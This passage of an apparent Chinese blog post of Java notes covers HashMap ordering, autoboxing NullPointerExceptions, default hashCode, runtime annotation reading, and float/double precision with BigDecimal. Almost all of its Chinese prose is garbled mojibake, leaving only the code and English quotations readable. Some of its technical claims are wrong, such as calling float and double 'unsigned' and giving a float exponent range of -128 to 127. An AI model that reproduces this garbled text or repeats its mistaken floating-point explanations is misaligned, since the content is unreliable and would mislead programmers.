inserted into the map (insertion-order).â€HashMap: â€œmakes no guarantees as to the order of the mapâ€TreeMap: â€œis sorted according to the natural ordering of its keys, or by a Comparatorâ€å®é™…å¼€å‘ä¸­æƒ³è¦æœ‰åºå°±ç”¨LinkedHashMapã€‚ä½†æ˜¯ HashMap&lt;String, Integer&gt; map = new HashMap&lt;&gt;(10); map.put(&quot;A&quot;, 1); map.put(&quot;B&quot;, 2); map.put(&quot;C&quot;, 3); map.put(&quot;D&quot;, 4); map.forEach((s, integer) -&gt; System.out.println(&quot;key = &quot;+s+&quot; value is &quot;+integer)); å®é™…æ˜¯æœ‰åºçš„ï¼Œæ–‡æ¡£æ˜¯è¯´[no guarantees]ã€‚çœ‹ä¸‹æºç ï¼Œå…¶å®æ˜¯åœ¨Hashmapç®—hashcodeçš„æ—¶å€™ï¼ŒStringçš„hashCodeæ¯”è¾ƒè€¿ã€‚ã€‚ã€‚Stuart Markæåˆ°äº†è¿™ä¸€ç‚¹ï¼Œå¹¶å¸Œæœ›å¼€å‘è€…ä¸è¦å¯„å¸Œæœ›äºè¿™ç§edge caseã€‚ 29. è‡ªåŠ¨è£…ç®±ä½¿ç”¨ä¸å°å¿ƒä¼šé€ æˆNullPointerExceptionå‚è€ƒ public class Test { public static long test(long value) { return value; } public static void main(String[] args) { Long value = null; //å› ä¸ºnullä¸èƒ½è¢«Boxingï¼Œæ‰€ä»¥å´©äº† // ... test(value); } } å…¶å®é‡ç‚¹åœ¨äºçœ‹javap -c ç”Ÿæˆçš„å­—èŠ‚ç  [ternary operatorä¹Ÿä¼šé€ æˆnpe]ä¸‰ç›®è¿ç®—ç¬¦ä¼šéšå¼è½¬å‹(https://stackoverflow.com/questions/25996591/java-ternary-operator-npe-autoboxing-string) This is happening because the type return by a ternary operator is the type of the first returned value. In this case, thatâ€™s the primitive value false. So Java is trying to take the primitive boolean returned by the ternary operator, then use autoboxing to convert it to a wrapper Boolean. But then you return a null from the ternary operator. And then when Java tries to autobox it, it throws an NPE because null canâ€™t be autoboxed. You should either use wrapper Booleans as the values in the ternary operator, or restructure this using if statements. ç®€å•æ¥è®²ï¼Œternary operatorè¿”å›å€¼çš„ç±»å‹æ˜¯ç¬¬ä¸€ä¸ªreturnå€¼çš„ç±»å‹(åœ¨è¿™é‡Œå°±æ˜¯boolean)ï¼Œä½†è¿”å›ä¸€ä¸ªNullçš„è¯ï¼Œnullå¹¶ä¸èƒ½è¢«autoBoxingï¼Œæ‰€ä»¥å´©äº†ã€‚ 30. å‡å¦‚æ²¡æœ‰override hashCodeæ–¹æ³•ï¼Œé‚£ä¹ˆdeugé‡Œé¢çœ‹åˆ°çš„æ˜¯ä»€ä¹ˆï¼Ÿ@HotSpotIntrinsicCandidate public native int hashCode();//æ˜¯ä¸€ä¸ªnativeæ–¹æ³• é»˜è®¤è¿”å›å†…å­˜ä¸­çš„åœ°å€å…¶å®ä¹Ÿä¸èƒ½çœŸå½“åšæ˜¯å†…å­˜åœ°å€ System.identityHashCode()æ–¹æ³•è¿”å›çš„å†…å®¹æ˜¯vm çš„implementation detailï¼ˆäº¦å³ä¸åŒvmä¹‹é—´çš„å®ç°æ–¹å¼å¯èƒ½ä¸åŒï¼‰ï¼Œè™½ç„¶å¤šæ•°æ—¶å€™è¿™ä¸ªå€¼æ˜¯objectçš„initial memory addressã€‚ä½†vméšæ—¶å¯èƒ½æŠŠè¿™ä¸ªobjectæŒªèµ°ï¼Œæ‰€ä»¥Getting the memory addresses of variables is meaningless within Javaã€‚ System.identityHashCodeè¿”å›çš„å½¢å¼æ˜¯1360875712è¿™æ ·çš„åè¿›åˆ¶çš„intï¼Œéœ€è¦è½¬æˆ2è¿›åˆ¶Integer.toBinaryString 31. æ¥å£é‡Œé¢æ”¾ä¸€ä¸ªæ¥å£è¿™ç§äº‹æƒ…ä¹Ÿä¸æ˜¯æ²¡å¹²è¿‡android.content.DialogInterface.java public interface DialogInterface { public static final int BUTTON_POSITIVE = -1; public static final int BUTTON_NEGATIVE = -2; public static final int BUTTON_NEUTRAL = -3; public void cancel(); public void dismiss(); interface OnCancelListener { public void onCancel(DialogInterface dialog); } interface OnDismissListener { public void onDismiss(DialogInterface dialog); } interface OnShowListener { public void onShow(DialogInterface dialog); } interface OnClickListener { public void onClick(DialogInterface dialog, int which); } interface OnMultiChoiceClickListener { public void onClick(DialogInterface dialog, int which, boolean isChecked); } interface OnKeyListener { public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event); } } æ¥å£é‡Œé¢æ”¾å¸¸é‡ä¹Ÿè¡Œå•Š 32.Stuart Marksåˆæåˆ°äº†å†™comparatræ—¶å¯èƒ½å‡ºç°çš„é”™è¯¯Comparison Method Violates Its General Contract! (Part 1) by Stuart Marks 33. javaä¹Ÿæ˜¯æœ‰äºŒç»´æ•°ç»„çš„34. åœ¨è¿è¡Œæ—¶å¾—è¿™ä¹ˆæ‹¿æ³¨è§£ä»£ç å‡ºè‡ªæ·±å…¥ç†è§£Javaï¼šæ³¨è§£ï¼ˆAnnotationï¼‰â€“æ³¨è§£å¤„ç†å™¨ /** * æ°´æœåç§°æ³¨è§£ * @author peida * */ @Target(ElementType.FIELD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface FruitName { String value() default &quot;&quot;; } /** * æ°´æœé¢œè‰²æ³¨è§£ * @author peida * */ @Target(ElementType.FIELD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface FruitColor { /** * é¢œè‰²æšä¸¾ * @author peida * */ public enum Color{ BULE,RED,GREEN}; /** * é¢œè‰²å±æ€§ * @return */ Color fruitColor() default Color.GREEN; } /** * æ°´æœä¾›åº”è€…æ³¨è§£ * @author peida * */ @Target(ElementType.FIELD) @Retention(RetentionPolicy.RUNTIME) @Documented public @interface FruitProvider { /** * ä¾›åº”å•†ç¼–å· * @return */ public int id() default -1; /** * ä¾›åº”å•†åç§° * @return */ public String name() default &quot;&quot;; /** * ä¾›åº”å•†åœ°å€ * @return */ public String address() default &quot;&quot;; } /***********æ³¨è§£ä½¿ç”¨***************/ public class Apple { @FruitName(&quot;Apple&quot;) private String appleName; @FruitColor(fruitColor=Color.RED) private String appleColor; @FruitProvider(id=1,name=&quot;é™•è¥¿çº¢å¯Œå£«é›†å›¢&quot;,address=&quot;é™•è¥¿çœè¥¿å®‰å¸‚å»¶å®‰è·¯89å·çº¢å¯Œå£«å¤§å¦&quot;) private String appleProvider; public void setAppleColor(String appleColor) { this.appleColor = appleColor; } public String getAppleColor() { return appleColor; } public void setAppleName(String appleName) { this.appleName = appleName; } public String getAppleName() { return appleName; } public void setAppleProvider(String appleProvider) { this.appleProvider = appleProvider; } public String getAppleProvider() { return appleProvider; } public void displayName(){ System.out.println(&quot;æ°´æœçš„åå­—æ˜¯ï¼šè‹¹æœ&quot;); } } /***********æ³¨è§£å¤„ç†å™¨***************/ public class FruitInfoUtil { public static void getFruitInfo(Class&lt;?&gt; clazz){ String strFruitName=&quot; æ°´æœåç§°ï¼š&quot;; String strFruitColor=&quot; æ°´æœé¢œè‰²ï¼š&quot;; String strFruitProvicer=&quot;ä¾›åº”å•†ä¿¡æ¯ï¼š&quot;; Field[] fields = clazz.getDeclaredFields(); for(Field field :fields){ if(field.isAnnotationPresent(FruitName.class)){ FruitName fruitName = (FruitName) field.getAnnotation(FruitName.class); strFruitName=strFruitName+fruitName.value(); System.out.println(strFruitName); } else if(field.isAnnotationPresent(FruitColor.class)){ FruitColor fruitColor= (FruitColor) field.getAnnotation(FruitColor.class); strFruitColor=strFruitColor+fruitColor.fruitColor().toString(); System.out.println(strFruitColor); } else if(field.isAnnotationPresent(FruitProvider.class)){ FruitProvider fruitProvider= (FruitProvider) field.getAnnotation(FruitProvider.class); strFruitProvicer=&quot; ä¾›åº”å•†ç¼–å·ï¼š&quot;+fruitProvider.id()+&quot; ä¾›åº”å•†åç§°ï¼š&quot;+fruitProvider.name()+&quot; ä¾›åº”å•†åœ°å€ï¼š&quot;+fruitProvider.address(); System.out.println(strFruitProvicer); } } } } /***********è¾“å‡ºç»“æœ***************/ public class FruitRun { /** * @param args */ public static void main(String[] args) { FruitInfoUtil.getFruitInfo(Apple.class); } } ==================================== æ°´æœåç§°ï¼šApple æ°´æœé¢œè‰²ï¼šRED ä¾›åº”å•†ç¼–å·ï¼š1 ä¾›åº”å•†åç§°ï¼šé™•è¥¿çº¢å¯Œå£«é›†å›¢ ä¾›åº”å•†åœ°å€ï¼šé™•è¥¿çœè¥¿å®‰å¸‚å»¶å®‰è·¯89å·çº¢å¯Œå£«å¤§å¦ 35 .å››èˆäº”å…¥é—®é¢˜ï¼ŒBigDecimal,BigIntegerè¿™äº›åŸºæœ¬æ•°æ®ç±»å‹ä¸­floatå’Œdoubleåªèƒ½ç”¨äºå¤„ç†ç§‘å­¦è¿ç®—æˆ–è€…å·¥ç¨‹è®¡ç®—ï¼Œå•†ä¸šåº”ç”¨ä¸­ï¼Œéœ€è¦ä½¿ç”¨BigDecimalæ¥å¤„ç†ã€‚ System.out.println(0.06 + 0.01); System.out.println(1.0 - 0.42); System.out.println(4.015 * 100); System.out.println(303.1 / 1000); //ä¸‹é¢æ˜¯å®é™…è¾“å‡ºï¼Œæ˜¾ç„¶æ˜¯ä¸å¯¹çš„ // 0.06999999999999999 // 0.5800000000000001 // 401.49999999999994 // 0.30310000000000004 double a = 4887233385.5; double b = 0.85; BigDecimal a1 = new BigDecimal(a); BigDecimal b1 = new BigDecimal(b); System.out.println(&quot;==============================================================&quot;); System.out.println(a*b); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1));//result2--&gt;4154148377.674999891481619374022926649558939971029758453369140625æ— é™ä¸å¾ªç¯,å…¶å®åé¢è¿˜æœ‰ System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(1, RoundingMode.HALF_UP)); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(5, RoundingMode.HALF_UP)); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(9, RoundingMode.HALF_UP)); System.out.println(&quot;result2--&gt;&quot;+a1.multiply(b1).setScale(11, RoundingMode.HALF_UP)); System.out.println(&quot;==============================================================&quot;); ä»¥ä¸‹ä¸ºå®é™…è¾“å‡º ==============================================================4.1541483776749997E9 //ç§‘å­¦è®¡æ•°æ³•åœ¨è¿™ç§åœºæ™¯ä¸‹å‡ ä¹æ²¡æ³•ç”¨ï¼ˆæ³¨æ„é»˜è®¤ç»™å‡ºäº†16ä½ï¼Œä¸‹é¢æœ‰è§£é‡Šï¼‰result2â€“&gt;4154148377.674999891481619374022926649558939971029758453369140625 //è¿™ä¸ªæ˜¯å®é™…å€¼result2â€“&gt;4154148377.7result2â€“&gt;4154148377.67500result2â€“&gt;4154148377.674999891 result2â€“&gt;4154148377.67499989148å®åœ¨é è°±çš„å››èˆäº”å…¥ RoundingMode.HALF_EVENå°±æ˜¯æŠŠè¿™ä¸ªå°æ•°åŒ–ä¸ºç¦»å®ƒæœ€è¿‘çš„å¶æ•°RoundingMode.HALF_UP å°±æ˜¯ç¢°åˆ°äº”å°±å¾€ä¸Šè¿›ä¸€ä½RoundingMode.HALF_DOWN å°±æ˜¯ç¢°åˆ°äº”å°±è§†ä¸º0RoundingMode.FLOOR å’ŒMath.floorå·®ä¸å¤šRoundingMode.CEILING å’ŒMath.ceilingå·®ä¸å¤šcore Libraryçš„å‘½åéƒ½å¾ˆæ˜“æ‡‚ ç”±æ­¤å¼•ç”³å‡ºï¼š System.out.println( 0.9999999f==1f ); // 7ä¸ª9 System.out.println( 0.99999999f==1f ); //8ä¸ª9 System.out.println( 0.999999999f==1f ); // 9ä¸ª9 // false // true // true public class FloatNumberAccuracy { public static void main(String[] args) { System.out.println(0.05+0.01); System.out.println(1.0-0.42); System.out.println(4.015*100); System.out.println(123.3/100); } } 0.060000000000000005 0.5800000000000001 401.49999999999994 1.2329999999999999 æ˜¾ç„¶åŒç²¾åº¦æµ®ç‚¹æ•°æ˜¯æ— æ³•ç²¾ç¡®è¡¨è¾¾æ•°å­¦ä¸Šçš„æœ‰äº›æ•°å­—çš„ Java æµ®ç‚¹æ•° floatå’Œdoubleç±»å‹çš„è¡¨ç¤ºèŒƒå›´å’Œç²¾åº¦å’Œæ•´æ•°å‹æ˜¯signedçš„ä¸ä¸€æ ·,floatå’Œdoubleæ˜¯unsignedã€‚è¿™32ä½æ˜¯æ€ä¹ˆåˆ†çš„ï¼š1bitï¼ˆç¬¦å·ä½ï¼‰ 8bitsï¼ˆæŒ‡æ•°ä½ï¼‰ 23bitsï¼ˆå°¾æ•°ä½ï¼‰ï¼ˆå†…å­˜ä¸­å°±é•¿è¿™æ ·ï¼‰doubleå æ®64bitã€‚1bitï¼ˆç¬¦å·ä½ï¼‰ 11bitsï¼ˆæŒ‡æ•°ä½ï¼‰ 52bitsï¼ˆå°¾æ•°ä½ï¼‰ï¼ˆå†…å­˜ä¸­å°±é•¿è¿™æ ·ï¼‰ æ‰€ä»¥floatçš„æŒ‡æ•°èŒƒå›´æ˜¯-128~127 ã€‚(2çš„8æ¬¡æ–¹)doubleçš„æŒ‡æ•°èŒƒå›´ä¸º-1024~+1023ã€‚å†å…·ä½“ç‚¹ï¼šfloatçš„èŒƒå›´ä¸º-2^128 ~ +2^127ï¼Œä¹Ÿå³-3.40E+38 ~ +3.40E+38ï¼› update : From 3.402,823,5 E+38 to 1.4 E-45(ç”±äºæ˜¯unsignedï¼Œè¿™åªæ˜¯æ­£æ•°éƒ¨åˆ†) the correct way: [-3.40E+38,-1.4 E-45 ] &amp;&amp; [1.4 E-45, +3.40E+38] ## ç«™åœ¨åè¿›åˆ¶çš„è§’åº¦æ¥çœ‹ï¼Œæ˜¯ç›¸å¯¹äº0å¯¹ç§°çš„ä¸¤ä¸ªåŒºé—´ã€‚æ•´ä¸ªå®æ•°è½´å¹¶æœªå®Œå…¨è¦†ç›–ã€‚ å¾ˆå¤šäººéƒ½è¯´è¿™äº›æœ€å¤§å€¼æœ€å°å€¼ä¸ç”¨è®°ï¼Œå¯¹åº”çš„åŒ…è£…ç±»éƒ½æœ‰å¸¸é‡MIN_VALUEå’ŒMAX_VALUEã€‚ç„¶è€Œï¼Œè¿™ä¸ªè¿˜æ˜¯æœ‰äº›éœ€è¦æ³¨æ„çš„ã€‚Float.MIN_VALUE å¹¶ä¸æ˜¯è´Ÿæ•°ï¼Œè€Œæ˜¯ä¸€ä¸ª0.00000XXX çš„å°æ•°ã€‚ä¸€èˆ¬è®¤ä¸ºè¿™ä¸ªå¸¸é‡åº”è¯¥èµ·ä¸€ä¸ªæ›´åˆé€‚çš„åå­—ï¼Œå¦å¤–ä¸è¦æŠŠFloat.MIN_VALUEå’ŒFloat.MIN_NORMALææ··æ·†ï¼› // Float public static final float MIN_NORMAL = 0x1.0p-126f; // 1.17549435E-38f // è¿™ä¸ªæ˜¯2^-126=1.175494350822..(æ³¨æ„å°æ•°ç‚¹åçš„å€¼å°±æ²¡æœ‰äº†ï¼Œå®åœ¨è¡¨ç¤ºä¸äº†) public static final float MIN_VALUE = 0x0.000002P-126f; // 1.4e-45f çœŸæ­£çš„MIN_VALUEåº”è¯¥æ˜¯MAX_VALUEçš„è´Ÿå€¼ public static final float MAX_VALUE = 0x1.fffffeP+127f; // 3.4028235e+38f //è¿™ä¸ªmaxå€’æ˜¯èµ·åèµ·çš„å¾ˆå¥½ // æ€ä¹ˆç®—çš„ æ‹¿ä¸ªè®¡ç®—å™¨ç®—ä¸‹ï¼š2^128 = 3.402823669209...ã€‚æ˜¯ä¸æ˜¯å°æ•°ç‚¹åç¬¬ä¸ƒä½å°±ä¸å¯¹äº†ï¼Œè¿™ä¸ªå°±çœ‹ä¸Šé¢çš„23bitäº† // Double public static final double MAX_VALUE = 0x1.fffffffffffffP+1023; // 1.7976931348623157e+308 //è¿™ä¸ªç¡®å®æ˜¯æœ€å¤§å€¼ public static final double MIN_NORMAL = 0x1.0p-1022; // 2.2250738585072014E-308 public static final double MIN_VALUE = 0x0.0000000000001P-1022; // 4.9e-324 -Double.MAX_VALUEæ‰æ˜¯ä½ èƒ½ç”¨doubleè¡¨ç¤ºçš„æœ€å°å€¼ Float.MAX_VALUE + 1 == Float.MAX_VALUE // true MIN_VALUEå’ŒNIN_NORMALçš„åŒºåˆ«floatå’Œdoubleæœ€ç»ˆåœ¨å†…å­˜ä¸­éƒ½æ˜¯ä»¥a^næ¬¡æ–¹æ¥è¡¨ç¤ºä¸ºåè¿›åˆ¶æ•°å€¼çš„ã€‚ä»¥floatä¸ºä¾‹æ¥è§£é‡Šä¸‹ï¼šfloatä¸€å…±32bitï¼Œå°±æ˜¯32ä¸ªæ§½å­ï¼Œç¬¬ä¸€ä¸ªæ‹¿æ¥è¡¨ç¤ºç¬¦å·(unsigned)ï¼Œé‚£è¿˜å‰©ä¸‹31ä¸ªï¼Œæœ€ç»ˆè¦ç”¨å‰©ä¸‹çš„31ä¸ªbitè¡¨ç¤ºå‡ºä¸€ä¸ªç§‘å­¦è®¡æ•°æ³•çš„Decimal.ä¸Šé¢è¯´äº†ï¼Œ8ä¸ªç”¨æ¥è¡¨ç¤ºæŒ‡æ•°ï¼Œä¹Ÿå°±æ˜¯2^8 = 128ï¼Œä¹Ÿå°±æ˜¯æŒ‡æ•°æ–¹é¢æœ€å°æ˜¯-127ï¼Œæœ€å¤§æ˜¯128ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸Šé¢é‚£ä¸ªa^nçš„nçš„èŒƒå›´æ˜¯[-127,128]ã€‚æ ¹æ®stackoverFlowçš„è§£é‡Šï¼ŒMIN_NORMALå°±æ˜¯äºŒè¿›åˆ¶å°æ•°ç‚¹å‰æœ‰ä¸€ä¸ª1å¼€å¤´çš„ï¼ŒMIN_VALUEå°±æ˜¯å¯ä»¥ç”¨0å¼€å¤´çš„æ‰€ä»¥å°±æ˜¯23ä¸ªæ§½å­å‰22ä¸ªéƒ½æ”¾äº†0ï¼Œæœ€åä¸€ä¸ªæ”¾äº†1ï¼Œä¹Ÿå°±æ˜¯åè¿›åˆ¶çš„2ï¼Œç®—ä¸ŠæŒ‡æ•°å±‚çš„-127ï¼Œä¹Ÿå°±æ˜¯2ä¹˜ä»¥2^-127 = 2^-126ï¼Œè®ºMIN_NORMALæ˜¯æ€ä¹ˆæ¥çš„ã€‚è¿˜å‰©ä¸‹32-1-8 = 23ä¸ªï¼Œç”¨æ¥è¡¨ç¤ºç¡®åˆ‡çš„å€¼ï¼Œ 2^23 = 8388608(7ä¸ªæ•°å­—ï¼Œæ‰€ä»¥7ä¸ªæ•°å­—ä¿ä¸å‡†ï¼Œä½†6ä¸ªæ˜¯æœ‰æŠŠæ¡çš„ï¼Œè®©7ä½ç»™æŒ‡æ•°ä½å§ï¼ŒæŠŠ10çš„-38æ¬¡æ–¹å˜æˆ10çš„-45æ¬¡æ–¹)ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸Šé¢ä¸ªa^nçš„açš„èŒƒå›´æ˜¯[1,8388608]ï¼Œè®ºMIN_VALUEæ˜¯æ€ä¹ˆæ¥çš„ã€‚ floatå’Œdoubleçš„å†…å­˜ç¤ºæ„å›¾doubleå’Œfloatéƒ½å±äºThe IEEE 754 format has one bit reserved for the sign and the remaining bits representing the magnitude. doubleçš„èŒƒå›´ä¸º-2^1024 ~ +2^1023ï¼Œä¹Ÿå³-1.79E+308 ~ +1.79E+308ã€‚å°±è¿™ä¹ˆç®—å‡ºæ¥çš„ã€‚è‡³äºfloaté‡Œé¢é‚£å‰©ä¸‹çš„23ä½å’Œdoubleé‡Œé¢å‰©ä¸‹çš„52ä½ï¼Œæ˜¯ç”¨æ¥è¡¨ç¤ºç²¾åº¦çš„ã€‚ floatï¼š2^23 = 8388608ï¼Œä¸€å…±ä¸ƒä½ï¼Œç”±äºæœ€å·¦ä¸º1çš„ä¸€ä½çœç•¥äº†ï¼Œè¿™æ„å‘³ç€æœ€å¤šèƒ½è¡¨ç¤º8ä½æ•°ï¼š 2*8388608 = 16777216 ã€‚æœ‰8ä½æœ‰æ•ˆæ•°å­—ï¼Œä½†ç»å¯¹èƒ½ä¿è¯çš„ä¸º7ä½ï¼Œä¹Ÿå³floatçš„ç²¾åº¦ä¸º7~8ä½æœ‰æ•ˆæ•°å­—ï¼›doubleï¼š2^52 = 4503599627370496ï¼Œä¸€å…±16ä½ï¼ŒåŒç†ï¼Œdoubleçš„ç²¾åº¦ä¸º16~17ä½ã€‚ æ‰€ä»¥ä¸Šé¢å‡ºç°äº†å°æ•°ç‚¹åæœ€å¤š16ä½çš„doubleã€‚æ‰€ä»¥ä¸Šé¢çš„javaä»£ç è¿˜å¯ä»¥æƒ³åˆ°ï¼š System.out.println( 0.9999999f==1f ); // 7ä¸ª9 System.out.println( 0.99999999f==1f ); //8ä¸ª9 System.out.println( 0.9999999996666666f==1f ); // 9ä¸ª9 å½“ä¸€ä¸ªfloatå°æ•°çš„å°æ•°ç‚¹åä½æ•°è¶…å‡ºäº†8ä¸ªä¹‹åï¼Œjavaå°±æ— æ³•ç”¨floatè¡¨ç¤ºè¿™åé¢çš„æ•°å­—äº†ã€‚åº”è¯¥è¯´ä¸€ä¸ªfloatæ•°æ®ç±»å‹èƒ½å¤Ÿä¿è¯ä¸æŸå¤±ç²¾åº¦çš„é™åˆ¶å°±æ˜¯æœ‰æ•ˆæ•°å­—6-7ä½ï¼ˆ6ä¸ªæ˜¯å‡†çš„ï¼Œ7ä¸ªä¸å¥½è¯´ï¼‰ã€‚æ‰€ä»¥ä¸Šé¢çš„ç¬¬8ä¸ª9ä¹‹åå†™ä»€ä¹ˆéƒ½æ˜¯trueçš„ã€‚éšæ‰‹å†™ä¸€ä¸ª float aa = 1123456789123456f; float bb = 1123456789123456.1f; System.out.println(aa==bb); // ideè‡ªåŠ¨é£šé»„ï¼Œæ˜¾ç¤ºalways ä¸ºtrue ä¸è¦ä»¥ä¸ºè‡ªå·±çœŸçš„æƒ³è¦å¤šå°‘å°±æœ‰å¤šå°‘ï¼Œfloatåé¢æœ€å¤šä½¿ç”¨8ä½æœ‰æ•ˆæ•°å­—ï¼Œdoubleæœ€å¤šèƒ½è¡¨ç¤º16ä½æœ‰æ•ˆæ•°å­—ã€‚ä¸ºä»€ä¹ˆï¼Œæ•°å­¦è¿™ä¹ˆè¯´çš„ã€‚è¿™ä¹ˆè¯´å§ï¼Œä»æ•´ä¸ªæ•°è½´æ¥çœ‹ï¼Œæ•´ä¸ªæ•°è½´æœ€å·¦è¾¹å’Œæœ€å³è¾¹éƒ½æ˜¯æ¥è§¦ä¸åˆ°çš„ã€‚å¦å¤–ï¼Œ0å·¦å³å„æœ‰ä¸€å°å—å®½åº¦ä¸º0.0000000xxxçš„å°èŒƒå›´æ˜¯è¡¨ç¤ºä¸äº†çš„ã€‚å°±ç®—æ˜¯å·²ç»è¦†ç›–åˆ°çš„ä½ç½®ï¼Œè®¡ç®—æœºè¿™ç§äºŒè¿›åˆ¶è¡¨è¾¾çš„æ–¹å¼åªæ˜¯é›¶é›¶æ•£æ•£çš„å æ®äº†å¾ˆå°‘çš„ä¸€éƒ¨åˆ†ã€‚ float f = 2.2f; double d = (double) f; System.out.println(d); f = 2.25f; d = (double) f; System.out.println(d); è¾“å‡ºï¼š 2.2000000476837162.25 è¿™æ ·çš„é—®é¢˜ä¹Ÿèƒ½å¤Ÿç†è§£äº†ï¼Œç»™ä½ 32ä¸ªbitï¼Œç¬¬ä¸€ä½è¡¨ç¤ºæ­£è´Ÿï¼Œç¬¬2-9ä½è¡¨ç¤ºæŒ‡æ•°ï¼Œå‰©ä¸‹23ä½è¡¨ç¤ºå®é™…çš„æ•°å­—ã€‚å¯¹äº2.2fï¼Œé¦–å…ˆç¬¬ä¸€ä½è¡¨ç¤ºæ­£è´Ÿï¼Œç„¶åä¸ªä½æ•°2å¯ä»¥è¡¨ç¤ºåœ¨ç¬¬äºŒä½ï¼Œå‰©ä¸‹çš„0.2è®¾æ³•ç”¨22ä½è¡¨ç¤ºã€‚ æ¥çœ‹åè¿›åˆ¶å°æ•°è½¬æ¢äºŒè¿›åˆ¶çš„é—®é¢˜ï¼Œä¾‹å¦‚ï¼š22.8125è½¬äºŒè¿›åˆ¶ æ•´æ•°å’Œå°æ•°åˆ†åˆ«è½¬æ¢ã€‚æ•´æ•°é™¤ä»¥2ï¼Œå•†ç»§ç»­é™¤ä»¥2ï¼Œå¾—åˆ°0ä¸ºæ­¢ï¼Œå°†ä½™æ•°é€†åºæ’åˆ—ã€‚22 / 2 11 ä½™011/2 5 ä½™ 15 /2 2 ä½™ 12 /2 1 ä½™ 01 /2 0 ä½™ 1æ‰€ä»¥22çš„äºŒè¿›åˆ¶æ˜¯10110å°æ•°ä¹˜ä»¥2ï¼Œå–æ•´ï¼Œå°æ•°éƒ¨åˆ†ç»§ç»­ä¹˜ä»¥2ï¼Œå–æ•´ï¼Œå¾—åˆ°å°æ•°éƒ¨åˆ†0ä¸ºæ­¢ï¼Œå°†æ•´æ•°é¡ºåºæ’åˆ—ã€‚0.8125x2=1.625 å–æ•´1,å°æ•°éƒ¨åˆ†æ˜¯0.6250.625x2=1.25 å–æ•´1,å°æ•°éƒ¨åˆ†æ˜¯0.250.25x2=0.5 å–æ•´0,å°æ•°éƒ¨åˆ†æ˜¯0.50.5x2=1.0 å–æ•´1,å°æ•°éƒ¨åˆ†æ˜¯0ï¼Œç»“æŸæ‰€ä»¥0.8125çš„äºŒè¿›åˆ¶æ˜¯0.1101åè¿›åˆ¶22.8125ç­‰äºäºŒè¿›åˆ¶10110.1101 å¯¹äº0.2æ¥è¯´ï¼Œå¾—åˆ°çš„æ˜¯ä¸€ä¸ªæ— çº¿å¾ªç¯çš„00110011001100110011â€¦.åŒºåŒº23ä½æ€ä¹ˆå¤Ÿç”¨ã€‚æ‰€ä»¥23ä½ä¹‹åçš„æ•°å­—è¢«æ— è§†äº†ï¼Œç„¶åæ‰“å°çš„æ—¶å€™å°è¯•å°†è¿™ä»…æœ‰çš„23ä½0101è¡¨ç¤ºæˆ10è¿›åˆ¶çš„æ—¶å€™ï¼Œæ— è®ºå¦‚ä½•æ˜¯å¾—ä¸åˆ°è·Ÿæ•°å­¦æ„ä¹‰ä¸Šçš„æ•°å­—ç›¸ç­‰çš„æ•°ã€‚ä½†å¯¹äºæœºå™¨æ¥è¯´ï¼Œå°±æ˜¯ä¸€æ ·çš„ï¼ŒIntelijé‡Œé¢floatè¶…è¿‡å°æ•°ç‚¹å8ä½è‡ªåŠ¨é£šé»„ï¼Œè¯´ä»€ä¹ˆis always trueã€‚ã€‚ã€‚å°±è¿™ä¹ˆ23ä¸ªæ§½å­ï¼Œç¡®å®æ²¡æ³•æ»¡è¶³å®é™…éœ€è¦çš„ä½æ•°è¦æ±‚ã€‚æ‰€ä»¥å®é™…ä¸Šæ˜¯2.2féœ€è¦æ— é™ä¸ªå°æ§½å­è¡¨ç¤ºï¼Œ2.25fæ­£å¥½åœåœ¨ï¼š0 100 0000 0001 0010 0000 0000 0000 0000 å°±å¤Ÿç”¨äº†ã€‚æœ‰æ—¶å€™floatæˆ–è€…doubleçš„ä½æ•°ä¸å¤Ÿäº†ï¼Œå°±ç”¨Stringå§ã€‚BigDecimalæä¾›äº†Stringä¸ºå‚æ•°çš„åˆå§‹åŒ–æ–¹æ³•ã€‚ double currentLat2 = 2.455675; BigDecimal b = new BigDecimal(currentLat2); currentLat2 = b.setScale(5, BigDecimal.ROUND_HALF_UP).doubleValue(); System.out.println(currentLat2); // è¾“å‡ºçš„æ˜¯2.45567è€Œä¸æ˜¯2.45568 String currentLat2 = &quot;2.455675&quot;; BigDecimal b = new BigDecimal(currentLat2); System.out.println(b.setScale(5,BigDecimal.ROUND_HALF_UP).doubleValue()); ç”¨Stringåˆå§‹åŒ–BigDecimal.åœ¨ã€ŠEffective Javaã€‹è¿™æœ¬ä¹¦ä¸­ä¹Ÿæåˆ°è¿™ä¸ªåŸåˆ™ï¼Œfloatå’Œdoubleåªèƒ½ç”¨æ¥åšç§‘å­¦è®¡ç®—æˆ–è€…æ˜¯å·¥ç¨‹è®¡ç®—ï¼Œåœ¨å•†ä¸šè®¡ç®—ä¸­æˆ‘ä»¬è¦ç”¨java.math.BigDecimalã€‚ä½¿ç”¨BigDecimalå¹¶ä¸”ä¸€å®šè¦ç”¨Stringæ¥å¤Ÿé€ ã€‚Note: the results of this constructor can be somewhat unpredictable. One might assume that new BigDecimal(.1) is exactly equal to .1, but it is actually equal to .1000000000000000055511151231257827021181583404541015625. This is so because .1 cannot be represented exactly as a double (or, for that matter, as a binary fraction of any finite length). Thus, the long value that is being passed in to the constructor is not exactly equal to .1, appearances nonwithstanding.The (String) constructor, on the other hand, is perfectly predictable: new BigDecimal(â€œ.1â€) is exactly equal to .1, as one would expect. Therefore, it is generally recommended that the (String) constructor be used in preference to this one. Floating point precision errorè¿™ç§äº‹å‡ ä¹æ‰€æœ‰è¯­è¨€éƒ½æœ‰ type -casting javaä¸­ä»doubleå¼ºè½¬floatï¼Œä»longå¼ºè½¬intæ˜¯æ€ä¹ˆå®ç°çš„ int 1000 å¼ºè½¬ byte å˜æˆ24 å­—èŠ‚åºå’Œç²¾åº¦æº¢å‡ºçš„é—®é¢˜ ä»å¼ºè½¬ byte è¯´èµ· è®¡ç®—æœºä¸­æ•´æ•°ä»¥è¡¥ç çš„å½¢å¼å­˜å‚¨ï¼ŒåŸç è¿›è¡Œæ˜¾ç¤ºã€‚3ä¼šå­˜æˆ0011ï¼Œ-3ä¼šå­˜æˆ1100ã€‚ä½¿ç”¨è¡¥ç 